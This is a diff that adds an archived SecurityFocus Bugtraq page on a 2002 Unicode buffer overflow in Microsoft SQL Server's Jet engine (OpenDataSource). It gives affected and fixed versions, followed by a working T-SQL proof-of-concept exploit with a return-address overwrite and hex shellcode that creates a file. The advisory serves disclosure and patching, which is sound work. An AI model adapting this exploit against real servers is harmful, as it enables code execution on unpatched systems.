@@ -1,0 +1,211 @@
+#SpeeDr00t@Black Falcon<br>#bid5057<p><b><span style="font-size: 18pt;">Microsoft SQL MS Jet Engine Unicode Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/5057/info">info</a><br><a href="http://www.securityfocus.com/bid/5057/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/5057/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/5057/solution">solution</a><br><a href="http://www.securityfocus.com/bid/5057/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				5057
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 19 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 19 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to NGSSoftware.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Microsoft SQL Server 2000  SP2<br/>
+					
+				
+					Microsoft SQL Server 2000  SP1<br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0 SP5<br/>
+</span>
+					
+				
+					Microsoft SQL Server 2000  <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT  4.0<br/>
+</span>
+					
+				
+					Microsoft JET  4.0 SP5<br/>
+					
+				
+					Microsoft JET  4.0 SP4<br/>
+					
+				
+					Microsoft JET  4.0 SP3<br/>
+					
+				
+					Microsoft JET  4.0 SP2<br/>
+					
+				
+					Microsoft JET  4.0 SP1<br/>
+					
+				
+					Microsoft JET  4.0<br/>
+<span class="related">
+						
+							+ 
+						
+						Microsoft Access 2000  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Microsoft Access 2000  <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Microsoft JET  4.0 SP6<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof-of-concept was submitted:<br/><br/>-------8&lt;---------<br/><br/>-- Simple Proof of Concept<br/>-- Exploits a buffer overrun in OpenDataSource()<br/>--<br/>-- Demonstrates how to exploit a UNICODE overflow using T-SQL<br/>-- Calls CreateFile() creating a file called c:\SQL-ODSJET-BO<br/>-- I'm overwriting the saved return address with 0x42B0C9DC<br/>-- This is in sqlsort.dll and is consistent between SQL 2000 SP1 and SP2<br/>-- The address holds a jmp esp instruction.<br/>--<br/>-- To protect against this overflow download the latest Jet Service<br/>-- pack from Microsoft - http://www.microsoft.com/<br/>--<br/>-- David Litchfield (david@ngssoftware.com)<br/>-- 19th June 2002<br/><br/><br/><br/>declare @exploit nvarchar(4000)<br/>declare @padding nvarchar(2000)<br/>declare @saved_return_address nvarchar(20)<br/>declare @code nvarchar(1000)<br/>declare @pad nvarchar(16)<br/>declare @cnt int<br/>declare @more_pad nvarchar(100)<br/><br/>select @cnt = 0<br/>select @padding = 0x41414141<br/>select @pad = 0x4141<br/><br/>while @cnt &lt; 1063<br/>begin<br/>  select @padding = @padding + @pad<br/>  select @cnt = @cnt + 1<br/>end<br/><br/>-- overwrite the saved return address<br/><br/>select @saved_return_address = 0xDCC9B042<br/>select @more_pad = 0x4343434344444444454545454646464647474747<br/><br/>-- code to call CreateFile(). The address is hardcoded to 0x77E86F87 - Win2K<br/>Sp2<br/>-- change if running a different service pack<br/><br/>select @code =<br/>0x558BEC33C05068542D424F6844534A4568514C2D4F68433A5C538D142450504050485050B0<br/>C05052B8876FE877FFD0CCCCCCCCCC<br/>select @exploit = N'SELECT * FROM<br/>penDataSource( ''Microsoft.Jet.OLEDB.4.0'',''Data Source="c:\'<br/>select @exploit = @exploit + @padding + @saved_return_address + @more_pad +<br/>@code<br/>select @exploit = @exploit + N'";User ID=Admin;Password=;Extended<br/>properties=Excel 5.0'')...xactions'<br/>exec (@exploit)<br/><br/>-------&gt;8---------
+	
+		<ul>
+</ul>
+</div>
